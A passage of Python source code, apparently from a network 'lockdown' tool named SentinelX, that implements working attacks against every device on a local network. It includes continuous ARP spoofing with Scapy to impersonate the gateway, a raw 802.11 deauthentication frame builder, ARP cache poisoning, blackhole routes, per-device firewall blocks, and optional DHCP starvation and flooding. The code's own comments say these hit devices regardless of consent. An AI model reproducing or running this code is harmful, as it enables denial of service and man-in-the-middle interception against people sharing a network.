        # NOW release the lockdown
        released = self.release_lockdown()
        
        if released:
            logger.critical("Continuous deauthentication stopped - Network restored")
            self.deauthenticated_ips.clear()
            return True
        else:
            logger.warning("Failed to release lockdown")
            return False
    
    def get_deauthenticated_ips(self) -> list:
        """
        Get list of IP addresses currently being deauthenticated
        
        Returns:
            Sorted list of IP addresses
        """
        return sorted(list(self.deauthenticated_ips))
    
    def get_lockdown_status(self) -> dict:
        """
        Get current lockdown and deauth status for GUI display
        
        Returns:
            Dictionary with status information
        """
        return {
            'active_lockdown': self.active_lockdown,
            'continuous_deauth_mode': self.deauth_continuous_mode,
            'threat_cleared': self.threat_cleared,
            'deauthenticated_ips': self.get_deauthenticated_ips(),
            'ip_count': len(self.deauthenticated_ips),
            'lockdown_reason': self.lockdown_reason
        }

    def release_lockdown(self, confirm_code: str = None) -> bool:
        """
        Release network lockdown (requires confirmation)
        
        Args:
            confirm_code: Confirmation code for security
            
        Returns:
            True if lockdown released
        """
        logger.info("Lockdown release requested")
        
        # Check if there's any active lockdown or continuous deauth
        if not self.active_lockdown and not self.deauth_continuous_mode:
            logger.warning("No active lockdown or continuous deauth to release")
            return False
        
        logger.critical("Releasing network lockdown - restoring connectivity")
        
        self.active_lockdown = False
        self.threat_cleared = True  # Stop continuous deauth loop
        self.deauth_continuous_mode = False
        self.lockdown_reason = None
        
        # Record in history
        if self.lockdown_history:
            self.lockdown_history[-1]["status"] = "released"
            self.lockdown_history[-1]["release_time"] = datetime.now().isoformat()
            self._save_lockdown_history()
        
        # Restore network connectivity
        self._restore_network_connectivity()
        
        logger.info("Network lockdown released successfully")
        return True
    
    def _restore_network_connectivity(self):
        """Restore normal network connectivity"""
        logger.info("Restoring network connectivity...")
        logger.critical("Releasing universal network isolation...")
        
        try:
            if os.name == 'nt':
                # Windows: Re-enable network adapters
                subprocess.run(
                    ["powershell", "-Command",
                     "Get-NetAdapter | Enable-NetAdapter -Confirm:$false"],
                    capture_output=True,
                    timeout=10
                )
                
                # Remove blocking firewall rules
                subprocess.run(
                    ["powershell", "-Command",
                     "Remove-NetFirewallRule -DisplayName 'Block-Gateway-*' -Confirm:$false -ErrorAction SilentlyContinue"],
                    capture_output=True,
                    timeout=10
                )
            else:
                # Linux: Bring up interfaces
                subprocess.run(["sudo", "ifup", "-a"], capture_output=True, timeout=10)
                
                # Flush iptables rules (careful!)
                try:
                    subprocess.run(
                        ["sudo", "iptables", "-F"],
                        capture_output=True,
                        timeout=10
                    )
                except:
                    pass
            
            logger.critical("Network isolation released - connectivity restored")
        except Exception as e:
            logger.error(f"Error restoring connectivity: {e}")
    
    def _apply_universal_network_isolation(self, mode: str):
        """
        Apply network isolation techniques that affect ALL devices on network
        regardless of whether they have SentinelX installed
        
        Uses multiple simultaneous attack vectors:
        1. ARP Spoofing - MITM gateway and drop/redirect traffic
        2. DHCP Starvation - Exhaust DHCP pool, prevent new connections
        3. Gateway-level blocking - Firewall rules at network edge
        4. MAC filtering - Block all unknown MAC addresses
        5. Network flooding - Saturate bandwidth
        
        Args:
            mode: Lockdown mode
        """
        logger.critical("=" * 70)
        logger.critical("UNIVERSAL NETWORK ISOLATION ACTIVATED")
        logger.critical("This will force isolation on ALL devices on the network")
        logger.critical("=" * 70)
        
        isolation_thread = threading.Thread(
            target=self._execute_universal_isolation,
            args=(mode,),
            daemon=True
        )
        isolation_thread.start()
    
    def _execute_universal_isolation(self, mode: str):
        """Execute universal isolation techniques"""
        try:
            logger.critical("=" * 70)
            logger.critical("EXECUTING UNIVERSAL NETWORK ISOLATION")
            logger.critical("=" * 70)
            
            # Use CACHED gateway and local interface info (detected once at start)
            gateway_ip = self.cached_gateway_ip
            local_ip = self.cached_local_ip
            interface = self.cached_interface
            
            logger.critical(f"[UNIVERSAL] Gateway detection result:")
            logger.critical(f"[UNIVERSAL]   Gateway IP: {gateway_ip}")
            logger.critical(f"[UNIVERSAL]   Local IP: {local_ip}")
            logger.critical(f"[UNIVERSAL]   Interface: {interface}")
            
            if not gateway_ip or not local_ip or not interface:
                logger.critical("[UNIVERSAL] FAILED - Could not fully determine network configuration")
                logger.critical("[UNIVERSAL] Skipping network-wide isolation - using local isolation only")
                return
            
            # Validate gateway IP format
            import ipaddress
            try:
                ipaddress.ip_address(gateway_ip)
            except ValueError:
                logger.critical(f"[UNIVERSAL] FAILED - Invalid gateway IP format: {gateway_ip}")
                logger.critical("[UNIVERSAL] Skipping network-wide isolation - using local isolation only")
                return
            
            logger.critical("[UNIVERSAL] Network configuration VALID - proceeding with isolation")
            logger.critical(f"[UNIVERSAL] Network Gateway: {gateway_ip}")
            logger.critical(f"[UNIVERSAL] Local IP: {local_ip}")
            logger.critical(f"[UNIVERSAL] Interface: {interface}")
            
            # Detect if this is Ethernet or WiFi
            is_ethernet = 'ethernet' in interface.lower() or 'eth' in interface.lower()
            
            # Execute isolation techniques in parallel
            threads = []
            
            # Check if Scapy is available and Npcap is installed
            npcap_available = False
            if SCAPY_AVAILABLE and not is_ethernet:
                # Only use Scapy/Npcap for WiFi (not Ethernet)
                # Ethernet should use native Windows blocking
                try:
                    from scapy.all import get_if_list
                    interfaces = get_if_list()
                    npcap_available = len(interfaces) > 0
                    if npcap_available:
                        logger.info(f"[NPCAP] Available for WiFi - {len(interfaces)} interfaces detected")
                except:
                    npcap_available = False
            
            if is_ethernet:
                logger.critical("[BLOCKING] Ethernet detected - using NATIVE WINDOWS ONLY (no Scapy)")
                npcap_available = False  # Force disable Scapy on Ethernet
            else:
                logger.info(f"[BLOCKING] Using Scapy/Npcap methods (npcap_available={npcap_available})")
            
            # Technique 1: ARP Spoofing (requires Npcap)
            if self.configuration.get("universal_lockdown_methods", {}).get("arp_spoofing", True):
                if npcap_available:
                    logger.critical("[UNIVERSAL] Starting ARP Spoofing isolation...")
                    t = threading.Thread(
                        target=self._arp_spoofing_isolation,
                        args=(gateway_ip, local_ip, interface),
                        daemon=True
                    )
                    t.start()
                    threads.append(("ARP Spoofing", t))
                else:
                    logger.info("[UNIVERSAL] ARP Spoofing skipped (Npcap not available) - relying on native Windows firewall + routes")
            
            # Technique 2: DHCP Starvation (requires Npcap)
            if self.configuration.get("universal_lockdown_methods", {}).get("dhcp_starvation", True):
                if npcap_available:
                    logger.critical("[UNIVERSAL] Starting DHCP Starvation attack...")
                    t = threading.Thread(
                        target=self._dhcp_starvation_attack,
                        args=(interface,),
                        daemon=True
                    )
                    t.start()
                    threads.append(("DHCP Starvation", t))
                else:
                    logger.info("[UNIVERSAL] DHCP Starvation skipped (Npcap not available)")
            
            # Technique 3: Gateway Blocking
            if self.configuration.get("universal_lockdown_methods", {}).get("gateway_blocking", True):
                logger.critical("[UNIVERSAL] Starting Gateway-level blocking...")
                t = threading.Thread(
                    target=self._gateway_level_blocking,
                    args=(gateway_ip, mode),
                    daemon=True
                )
                t.start()
                threads.append(("Gateway Blocking", t))
            
            # Technique 4: MAC Filtering
            if self.configuration.get("universal_lockdown_methods", {}).get("mac_filtering", True):
                t = threading.Thread(
                    target=self._apply_mac_filtering,
                    args=(interface,),
                    daemon=True
                )
                t.start()
                threads.append(("MAC Filtering", t))
            
            # Technique 5: Deauthentication Attack (ALWAYS run - contains native Windows blocking)
            if self.configuration.get("universal_lockdown_methods", {}).get("deauth_attack", True):
                # ALWAYS launch deauth thread - it contains critical native Windows blocking
                # (routes, firewall, ARP poisoning) that works on Ethernet WITHOUT Npcap
                logger.critical("[UNIVERSAL] Starting DEAUTHENTICATION attack...")
                logger.critical("[UNIVERSAL] This will FORCE all devices OFFLINE from network")
                t = threading.Thread(
                    target=self._deauthentication_attack,
                    args=(gateway_ip, local_ip, interface),
                    daemon=True
                )
                t.start()
                threads.append(("Deauthentication Attack", t))
            
            # Technique 6: Network Flooding (optional, more aggressive)
            if self.configuration.get("universal_lockdown_methods", {}).get("network_flooding", False):
                t = threading.Thread(
                    target=self._network_flooding,
                    args=(gateway_ip, interface),
                    daemon=True
                )
                t.start()
                threads.append(("Network Flooding", t))
            
            # Wait for threads to complete
            for name, thread in threads:
                thread.join(timeout=30)
                logger.info(f"{name} isolation technique completed")
            
            logger.critical("Universal network isolation ACTIVE - All devices isolated")
            
        except Exception as e:
            logger.error(f"Error executing universal isolation: {e}")
    
    def _get_network_gateway(self) -> tuple:
        """
        Detect network gateway and local interface using ipconfig
        PRIORITIZES interfaces with actual Default Gateways
        
        Returns:
            Tuple of (gateway_ip, local_ip, interface_name)
        """
        try:
            if os.name == 'nt':
                # Windows: Use ipconfig /all to find gateway and IP
                result = subprocess.run(
                    ["ipconfig", "/all"],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result.returncode != 0 or not result.stdout:
                    logger.warning("ipconfig failed")
                    return None, None, None
                
                lines = result.stdout.split('\n')
                
                # Collect ALL interfaces with their IPs and gateways
                interfaces = {}  # {adapter_name: {'ip': x, 'gateway': y}}
                current_adapter = None
                current_ip = None
                current_gateway = None
                
                for i, line in enumerate(lines):
                    line_lower = line.lower()
                    
                    # Detect adapter name (adapter header line)
                    if 'adapter' in line_lower and ':' in line and 'ipv4' not in line_lower and 'ipv6' not in line_lower:
                        # Save previous adapter if it had an IP
                        if current_adapter and current_ip:
                            interfaces[current_adapter] = {
                                'ip': current_ip,
                                'gateway': current_gateway
                            }
                        # Start new adapter
                        raw_adapter = line.split(':')[0].strip()
                        current_adapter = raw_adapter if raw_adapter and len(raw_adapter) > 3 else None
                        current_ip = None
                        current_gateway = None
                        logger.debug(f"Found adapter: {current_adapter}")
                    
                    # Extract IPv4 address
                    if 'ipv4 address' in line_lower and '.' in line and current_adapter:
                        try:
                            parts = line.split(':')[1:] if ':' in line else [line]
                            ip_raw = ':'.join(parts).strip()
                            ip_raw = ip_raw.split('(')[0].strip()
                            if ip_raw and ip_raw != '0.0.0.0':
                                import ipaddress
                                ipaddress.ip_address(ip_raw)
                                current_ip = ip_raw
                                logger.debug(f"  → IP: {current_ip}")
                        except:
                            pass
                    
                    # Extract gateway (Default Gateway)
                    if 'default gateway' in line_lower and '.' in line and current_adapter:
                        try:
                            parts = line.split(':')[1:] if ':' in line else [line]
                            gw_raw = ':'.join(parts).strip()
                            gw_raw = gw_raw.split('(')[0].strip()
                            gw_raw = gw_raw.split('%')[0].strip()
                            if gw_raw and gw_raw != '0.0.0.0' and '.' in gw_raw:
                                import ipaddress
                                ipaddress.ip_address(gw_raw)
                                current_gateway = gw_raw
                                logger.debug(f"  → Gateway: {current_gateway}")
                        except:
                            pass
                
                # Save last adapter
                if current_adapter and current_ip:
                    interfaces[current_adapter] = {
                        'ip': current_ip,
                        'gateway': current_gateway
                    }
                
                logger.debug(f"Found {len(interfaces)} adapters with IPv4: {list(interfaces.keys())}")
                
                # PRIORITY 1: Find interface with ACTUAL Default Gateway
                for adapter_name, config in interfaces.items():
                    if config.get('gateway') and config.get('ip'):
                        logger.info(f"✓ Using interface with real gateway: {adapter_name}")
                        logger.info(f"  IP={config['ip']}, Gateway={config['gateway']}")
                        return config['gateway'], config['ip'], adapter_name
                
                # PRIORITY 2: Find interface without gateway (link-local, isolated)
                # Use the first one, preferring link-local
                link_local = None
                other = None
                for adapter_name, config in interfaces.items():
                    if config.get('ip'):
                        if config['ip'].startswith('169.254.') and not link_local:
                            link_local = (adapter_name, config['ip'])
                        elif not other:
                            other = (adapter_name, config['ip'])
                
                if link_local:
                    adapter_name, ip = link_local
                    logger.warning(f"⚠ No gateway found - using link-local interface: {adapter_name}")
                    logger.warning(f"  IP={ip} (using as both local and gateway)")
                    return ip, ip, adapter_name
                elif other:
                    adapter_name, ip = other
                    logger.warning(f"⚠ No gateway found - using first available interface: {adapter_name}")
                    logger.warning(f"  IP={ip} (using as both local and gateway)")
                    return ip, ip, adapter_name
                
                logger.error("❌ No IPv4 interfaces found")
                return None, None, None
                
            else:
                # Linux fallback
                result = subprocess.run(["ip", "route"], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'default via' in line:
                        parts = line.split()
                        gateway = parts[2]
                        interface = parts[4]
                        hostname = socket.gethostname()
                        local_ip = socket.gethostbyname(hostname)
                        return gateway, local_ip, interface
                
                return None, None, None
                
        except Exception as e:
            logger.error(f"Error detecting gateway: {e}")
            return None, None, None
    
    def _arp_spoofing_isolation(self, gateway_ip: str, local_ip: str, interface: str):
        """
        Use ARP spoofing to become MITM and block all traffic
        Tells all devices this machine IS the gateway, intercepts and DROPS traffic
        
        Args:
            gateway_ip: Real gateway IP
            local_ip: Local machine IP
            interface: Network interface
        """
        if not SCAPY_AVAILABLE:
            logger.info("Scapy not available for ARP spoofing - native Windows blocking only")
            return
        
        try:
            logger.info(f"Attempting ARP spoofing on {interface}")
            
            from scapy.all import ARP, Ether, sendp, srp, IP, ICMP, conf
            import time as time_module
            
            # Try ARP spoofing, but suppress errors gracefully (Npcap issues)
            try:
                for iface_name, iface_obj in conf.ifaces.data.items():
                    if hasattr(iface_obj, 'ip') and iface_obj.ip == local_ip:
                        scapy_interface = iface_name
                        local_mac = iface_obj.mac
                        logger.info(f"Resolved interface '{interface}' to Scapy name: {scapy_interface}")
                        break
            except Exception as e:
                logger.debug(f"Could not resolve via conf.ifaces: {e}")
            
            # Fallback: use interface as-is
            if not scapy_interface:
                scapy_interface = interface
                logger.warning(f"Using interface as-is: {interface}")
            
            if not local_mac:
                local_mac = self._get_interface_mac(interface)
                logger.info(f"Resolved local MAC: {local_mac}")
            
            # Scan network to find all devices
            network_range = self._get_network_range(local_ip)
            if not network_range:
                logger.warning("Could not determine network range")
                return
            
            logger.critical(f"Scanning network {network_range}...")
            
            # ARP scan to find live devices
            arp_request = ARP(pdst=network_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=local_mac)
            packet = ether / arp_request
            
            devices = []
            try:
                logger.debug(f"Sending ARP scan on {scapy_interface}...")
                result = srp(packet, timeout=2, verbose=False, iface=scapy_interface)[0]
                devices = [client[1].psrc for client in result]
                logger.info(f"ARP scan found {len(devices)} devices")
            except Exception as scan_error:
                logger.warning(f"ARP scan failed ({scan_error}) - will use broadcast spoof")
                devices = [f"192.168.{gateway_ip.split('.')[2]}.{i}" for i in range(1, 255)]
            
            logger.critical(f"Found {len(devices)} devices on network")
            
            # Continuously spoof ARP replies to claim gateway IP
            logger.critical(f"Spoofing ARP replies - claiming to BE {gateway_ip}")
            logger.critical(f"All traffic destined for gateway will be intercepted and DROPPED")
            
            spoof_count = 0
            try:
                while self.active_lockdown:
                    # Send ARP spoofs claiming we ARE the gateway
                    for device_ip in devices[:50]:  # Limit to avoid performance issues
                        if device_ip == local_ip:
                            continue
                        
                        try:
                            # Get device's MAC
                            try:
                                device_mac = self._get_mac_address(device_ip, scapy_interface)
                            except Exception as mac_error:
                                logger.debug(f"MAC lookup failed for {device_ip}: {mac_error}")
                                device_mac = "ff:ff:ff:ff:ff:ff"  # Broadcast MAC fallback
                            
                            # Send ARP: Claim we ARE the gateway
                            arp_reply = ARP(
                                op=2,  # Is-at
                                pdst=device_ip,
                                psrc=gateway_ip,
                                hwdst=device_mac,
                                hwsrc=local_mac
                            )
                            
                            # Use sendp() with Ether for L2 transmission (required on link-local)
                            ether = Ether(dst=device_mac, src=local_mac)
                            packet = ether / arp_reply
                            try:
                                sendp(packet, verbose=False, iface=scapy_interface)
                                spoof_count += 1
                            except Exception as send_error:
                                logger.debug(f"sendp() failed for Phase 1 on {scapy_interface}: {send_error}")
                            
                            # Also send reverse ARP: Tell gateway we own all these IPs
                            arp_claim = ARP(
                                op=2,
                                pdst=gateway_ip,
                                psrc=device_ip,
                                hwdst="ff:ff:ff:ff:ff:ff",
                                hwsrc=local_mac
                            )
                            # Use sendp() with broadcast Ether for L2 transmission
                            ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=local_mac)
                            packet = ether / arp_claim
                            try:
                                sendp(packet, verbose=False, iface=scapy_interface)
                                spoof_count += 1
                            except Exception as send_error:
                                logger.debug(f"sendp() failed for Phase 2 on {scapy_interface}: {send_error}")
                            
                        except Exception as device_error:
                            logger.debug(f"Error processing device {device_ip}: {device_error}")
                    
                    if spoof_count % 200 == 0 and spoof_count > 0:
                        logger.critical(f"ARP spoofing active - {spoof_count} packets sent TO {len(devices)} devices")
                    
                    # Send fast spoof rate for effectiveness
                    time_module.sleep(0.05)
            
            except KeyboardInterrupt:
                logger.info("ARP spoofing stopped")
            
            logger.critical(f"ARP spoofing sent {spoof_count} packets total")
            
        except Exception as e:
            logger.debug(f"ARP spoofing error (non-critical): {type(e).__name__}: {e}")
    
    def _resolve_interface_for_scapy(self, interface: str) -> tuple:
        """
        Get Scapy-compatible interface name and MAC address
        
        Returns the FRIENDLY interface name that Scapy's sendp() can understand,
        NOT an NPF path (which sendp() doesn't handle well).
        
        Args:
            interface: Interface string (may be friendly name or with "adapter" prefix)
        
        Returns:
            Tuple of (friendly_interface_name, mac_address) for use with sendp()
        """
        try:
            from scapy.arch.windows import get_windows_if_list
            
            # Clean up interface name - remove "adapter" prefix if present
            # E.g., "Ethernet adapter Ethernet" -> "Ethernet"
            iface_to_find = interface.split()[-1] if interface else ""
            
            try:
                interfaces = get_windows_if_list()
                
                # Find exact name match (will search for the last word, which is the actual name)
                for iface in interfaces:
                    if isinstance(iface, dict):
                        iname = iface.get('name', '')
                        # Try exact match first
                        if iname == interface:
                            mac = iface.get('mac', 'ff:ff:ff:ff:ff:ff')
                            logger.debug(f"Found exact interface match: {iname}, MAC: {mac}")
                            return iname, mac
                        # Try matching just the name part
                        if iname == iface_to_find:
                            mac = iface.get('mac', 'ff:ff:ff:ff:ff:ff')
                            logger.debug(f"Found interface: {iname}, MAC: {mac}")
                            return iname, mac
                
                # Secondary: Look for Wi-Fi if not found
                if 'Wi-Fi' in interface or 'WiFi' in interface or 'wireless' in interface.lower():
                    for iface in interfaces:
                        if isinstance(iface, dict):
                            iname = iface.get('name', '')
                            if iname == 'Wi-Fi':
                                mac = iface.get('mac', 'ff:ff:ff:ff:ff:ff')
                                logger.debug(f"Using fallback Wi-Fi interface")
                                return iname, mac
                
                # Tertiary: Look for Ethernet
                if 'ethernet' in interface.lower() or 'eth' in interface.lower():
                    for iface in interfaces:
                        if isinstance(iface, dict):
                            iname = iface.get('name', '')
                            if iname == 'Ethernet':
                                mac = iface.get('mac', 'ff:ff:ff:ff:ff:ff')
                                logger.debug(f"Using fallback Ethernet interface")
                                return iname, mac
                
                # Final fallback: use first interface with valid MAC
                for iface in interfaces:
                    if isinstance(iface, dict):
                        mac = iface.get('mac')
                        if mac and mac != '' and 'ff:ff:ff:ff:ff:ff' not in mac:
                            iname = iface.get('name', interface)
                            logger.debug(f"Using first available interface: {iname}, MAC: {mac}")
                            return iname, mac
                
            except Exception as e:
                logger.debug(f"Error looking up interface in list: {e}")
            
            # Absolute fallback: return interface as-is
            logger.warning(f"Could not resolve interface '{interface}' to friendly name, using as-is")
            return interface, "ff:ff:ff:ff:ff:ff"
            
        except Exception as e:
            logger.error(f"Critical interface resolution error: {e}")
            return interface, "ff:ff:ff:ff:ff:ff"
    
    def _check_npcap_installation(self) -> bool:
        """
        Check if npcap is properly installed on Windows.
        npcap is required for WiFi deauthentication attacks.
        Checks multiple possible registry paths for npcap.
        """
        import winreg
        import os
        
        # Try multiple registry paths (npcap can be installed in different locations)
        possible_paths = [
            r"Software\Nmap\Npcap",           # Standard path (Nmap's npcap)
            r"Software\Npcap",                # Alternative path
            r"Software\Wow6432Node\Npcap",    # 32-bit compatibility path (common!)
            r"Software\Wow6432Node\Nmap\Npcap", # 32-bit Nmap path
        ]
        
        for reg_path in possible_paths:
            try:
                # Try to open the registry key
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
                    # Try to read 'InstallPath' value first
                    try:
                        install_path = winreg.QueryValueEx(key, "InstallPath")[0]
                        logger.info(f"[NPCAP] Found npcap at: {install_path}")
                        if os.path.exists(install_path):
                            logger.info(f"[NPCAP] Registry path: {reg_path}")
                            return True
                    except FileNotFoundError:
                        # Try unnamed value (empty string) - some npcap versions store path here
                        try:
                            install_path = winreg.QueryValueEx(key, "")[0]
                            logger.info(f"[NPCAP] Found npcap at: {install_path}")
                            if os.path.exists(install_path):
                                logger.info(f"[NPCAP] Registry path: {reg_path}")
                                return True
                        except:
                            pass
            except FileNotFoundError:
                # This registry path doesn't exist, try next one
                continue
            except Exception as e:
                logger.debug(f"[NPCAP] Error checking {reg_path}: {e}")
                continue
        
        logger.warning("[NPCAP] npcap not found in any registry path")
        logger.info("[NPCAP] Install npcap from: https://nmap.org/npcap/")
        return False
    
    def _configure_scapy_for_npcap(self) -> bool:
        """
        Configure Scapy to explicitly use npcap for WiFi packet injection.
        Returns True if npcap is properly configured, False otherwise.
        """
        try:
            from scapy.all import conf
            import os
            
            # Check if npcap is installed
            if not self._check_npcap_installation():
                logger.warning("[NPCAP] npcap not detected - install from: https://nmap.org/npcap/")
                return False
            
            # Configure Scapy to use npcap
            # On Windows, Scapy can use both WinPcap and Npcap
            # We explicitly prefer npcap
            conf.use_pcap = True  # Use libpcap (npcap on Windows)
            conf.use_dnet = False  # Don't use dnet, rely on npcap/pcap
            
            logger.info("[NPCAP] Scapy configured for npcap operation")
            logger.info(f"[NPCAP] Conf.iface: {conf.iface}")
            
            return True
            
        except Exception as e:
            logger.warning(f"[NPCAP] Error configuring Scapy for npcap: {e}")
            return False

    def _deauthentication_attack(self, gateway_ip: str, local_ip: str, interface: str):
        """
        WiFi DEAUTHENTICATION ATTACK using npcap
        Workflow:
        1. Check npcap installation and configure Scapy
        2. ARP scan to discover all devices + their MACs
        3. Build 802.11 deauth frames
        4. Send with npcap-optimized packet injection
        
        Args:
            gateway_ip: Gateway IP address
            local_ip: Local machine IP
            interface: Network interface (may be in NPF format)
        """
        import struct
        import socket as ws_socket
        import time
        from scapy.all import conf
        
        if not SCAPY_AVAILABLE:
            logger.warning("Scapy not available for deauthentication attack - using ARP attack instead")
            return
        
        try:
            logger.critical("Starting DEAUTHENTICATION attack via raw socket")
            logger.critical("Step 1: Discovering all devices in network via ARP scan...")
            
            # ===== STEP 1: ARP DISCOVERY =====
            # Resolve interface FIRST - before ARP scan
            resolved_interface, interface_mac = self._resolve_interface_for_scapy(interface)
            logger.info(f"[ARP] Using interface: {resolved_interface}, MAC: {interface_mac}")
            
            # Get network range
            network_range = self._get_network_range(local_ip)
            if not network_range:
                logger.warning("Could not determine network range")
                return
            
            # Discover devices via native Windows ARP command (NO SCAPY)
            discovered_devices = {}  # {ip: mac}
            try:
                logger.critical("Step 2: Device discovery via native Windows commands (Npcap-free)")
                
                # Use native Windows: arp -a to find devices on network
                result = subprocess.run(
                    ["arp", "-a"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                
                # Parse arp -a output to find active devices in the network range
                import re
                for line in result.stdout.split('\n'):
                    # Look for IPv4 patterns in arp output
                    # Format: "IP Address      Physical Address      Type"
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f\-]+)\s+dynamic', line, re.IGNORECASE)
                    if match:
                        device_ip = match.group(1)
                        device_mac = match.group(2).replace('-', ':')
                        
                        # Skip our own IP
                        if device_ip == local_ip:
                            logger.debug(f"Skipping own IP: {device_ip}")
                            continue
                        
                        discovered_devices[device_ip] = device_mac
                        self.deauthenticated_ips.add(device_ip)
                
                # If arp -a didn't find anything, estimate network size and add default route
                if not discovered_devices:
                    logger.warning("No devices found via arp -a - using estimated network scan")
                    # Add all IPs in the network range to block list
                    network_range = self._get_network_range(local_ip)
                    if network_range:
                        import ipaddress
                        try:
                            network = ipaddress.ip_network(network_range, strict=False)
                            # Block all IPs in network except gateway
                            for ip in network.hosts():
                                ip_str = str(ip)
                                if ip_str != local_ip:
                                    discovered_devices[ip_str] = "unknown"
                        except:
                            pass
                
                logger.critical(f"Step 2: ARP discovery found {len(discovered_devices)} devices")
                for ip, mac in list(discovered_devices.items())[:10]:
                    logger.info(f"  - {ip} ({mac})")
                if len(discovered_devices) > 10:
                    logger.info(f"  ... and {len(discovered_devices) - 10} more devices")
                
                # Block discovered devices from reaching internet via multiple methods (Windows)
                if os.name == 'nt' and len(discovered_devices) > 0:
                    logger.critical(f"Applying NATIVE WINDOWS blocking to {len(discovered_devices)} devices")
                    
                    # METHOD 1: Add blocking routes (native Windows - no drivers needed)
                    logger.critical("METHOD 1: Adding blocking routes for each device")
                    try:
                        # Get a non-routable gateway
                        blocking_gateway = "127.0.0.1"  # Loopback = traffic goes nowhere
                        
                        for device_ip in discovered_devices.keys():
                            try:
                                # Add route that directs device traffic to loopback (black hole)
                                subprocess.run(
                                    ["route", "add", device_ip, "mask", "255.255.255.255", blocking_gateway],
                                    capture_output=True,
                                    timeout=2,
                                    check=False
                                )
                                logger.debug(f"Route: Blocking {device_ip} -> {blocking_gateway}")
                            except Exception as e:
                                logger.debug(f"Route error for {device_ip}: {e}")
                    except Exception as e:
                        logger.error(f"Routing method failed: {e}")
                    
                    # METHOD 2: Poison ARP cache - static ARP entries make devices unreachable
                    logger.critical("METHOD 2: Poisoning ARP cache with invalid MACs")
                    try:
                        invalid_mac = "00:00:00:00:00:00"  # Invalid MAC - devices can't reach this
                        
                        for device_ip in discovered_devices.keys():
                            try:
                                # Add static ARP entry with invalid MAC
                                # This poisons the device's ARP cache
                                subprocess.run(
                                    ["arp", "-s", device_ip, invalid_mac],
                                    capture_output=True,
                                    timeout=2,
                                    check=False
                                )
                                logger.debug(f"ARP: Poisoned {device_ip} with invalid MAC")
                            except Exception as e:
                                logger.debug(f"ARP error for {device_ip}: {e}")
                    except Exception as e:
                        logger.error(f"ARP poisoning failed: {e}")
                    
                    # METHOD 3: Netsh firewall rules (already proven to work)
                    logger.critical("METHOD 3: Creating netsh firewall blocking rules")
                    try:
                        for device_ip in discovered_devices.keys():
                            try:
                                # Clear any existing rules for this IP first
                                subprocess.run(
                                    ["netsh", "advfirewall", "firewall", "delete", "rule",
                                     f"name=Block-{device_ip}"],
                                    capture_output=True,
                                    timeout=2,
                                    check=False
                                )
                                
                                # Add new blocking rule - bidirectional, all protocols
                                subprocess.run(
                                    ["netsh", "advfirewall", "firewall", "add", "rule",
                                     f"name=Block-{device_ip}",
                                     "dir=in", "action=block",
                                     f"remoteip={device_ip}",
                                     "protocol=any",
                                     "enable=yes"],
                                    capture_output=True,
                                    timeout=2,
                                    check=False
                                )
                                
                                # Also block outbound (unreachable destination)
                                subprocess.run(
                                    ["netsh", "advfirewall", "firewall", "add", "rule",
                                     f"name=Block-Out-{device_ip}",
                                     "dir=out", "action=block",
                                     f"remoteip={device_ip}",
                                     "protocol=any",
                                     "enable=yes"],
                                    capture_output=True,
                                    timeout=2,
                                    check=False
                                )
                            except Exception as e:
                                logger.debug(f"Firewall rule error for {device_ip}: {e}")
                    except Exception as e:
                        logger.error(f"Firewall method failed: {e}")
                    
                    # METHOD 4: Disable IP forwarding at system level
                    logger.critical("METHOD 4: Disabling IP forwarding to prevent relay")
                    try:
                        subprocess.run(
                            ["netsh", "int", "ipv4", "set", "global", "forwarding=disabled"],
                            capture_output=True,
                            timeout=3,
                            check=False
                        )
                        logger.critical("IP Forwarding DISABLED - no traffic relay possible")
                    except Exception as e:
                        logger.error(f"IP forwarding disable failed: {e}")
                    
                    logger.critical(f"BLOCKING COMPLETE: {len(discovered_devices)} devices are completely isolated (routes + ARP poisoning + firewall)")

            
            except Exception as e:
                logger.warning(f"ARP scan failed ({e}) - will use broader broadcast approach")
                discovered_devices = {}
            
            # Get gateway MAC
            gateway_mac = self._gateway_mac_address(gateway_ip)
            if not gateway_mac or gateway_mac == "ff:ff:ff:ff:ff:ff":
                gateway_mac = interface_mac
            logger.info(f"Gateway MAC: {gateway_mac}")
            
            # ===== STEP 3: BUILD DEAUTH FRAMES =====
            logger.critical("Step 3: Building deauth frames as raw bytes...")
            
            def mac_to_bytes(mac_str: str) -> bytes:
                """Convert MAC address string to bytes"""
                return bytes.fromhex(mac_str.replace(':', ''))
            
            def build_deauth_frame(target_mac: str, source_mac: str, bssid_mac: str) -> bytes:
                """Build raw 802.11 Deauth frame"""
                frame_control = 0xc0
                flags = 0x00
                frame_control_bytes = struct.pack('<H', (frame_control << 8) | flags)
                duration = struct.pack('<H', 0)
                addr1 = mac_to_bytes(target_mac)
                addr2 = mac_to_bytes(source_mac)
                addr3 = mac_to_bytes(bssid_mac)
                seq_frag = struct.pack('<H', 0)
                reason_code = struct.pack('<H', 7)
                frame = frame_control_bytes + duration + addr1 + addr2 + addr3 + seq_frag + reason_code
                return frame
            
            logger.critical("Step 4: Attempting 802.11 DEAUTHENTICATION attack...")
            
            # Check if this is WiFi or Ethernet - deauth only works on WiFi
            is_wifi = 'wifi' in interface.lower() or 'wireless' in interface.lower() or 'wlan' in interface.lower()
            is_ethernet = 'ethernet' in interface.lower() or 'eth' in interface.lower()
            
            # Try using Scapy's Dot11 layer for WiFi deauth
            deauth_count = 0
            gateway_mac = self._gateway_mac_address(gateway_ip)
            if not gateway_mac or gateway_mac == "ff:ff:ff:ff:ff:ff":
                gateway_mac = interface_mac
            
            # CRITICAL: Skip deauth if no devices discovered - nothing to attack
            if len(discovered_devices) == 0:
                logger.warning("No devices discovered on network - skipping deauthentication attack (nothing to deauth)")
                logger.info("Attack methods will fall back to ARP spoofing and firewall rules")
            elif is_ethernet and not is_wifi:
                logger.warning(f"⚠ Interface '{interface}' is ETHERNET (wired) - 802.11 deauth doesn't work on wired networks")
                logger.info("Relying on ARP spoofing and gateway blocking instead")
            else:
                try:
                    from scapy.all import Dot11, Dot11Deauth, Dot11ProbeReq, RadioTap, sendp
                    
                    # ===== NPCAP CONFIGURATION =====
                    npcap_configured = self._configure_scapy_for_npcap()
                    if npcap_configured:
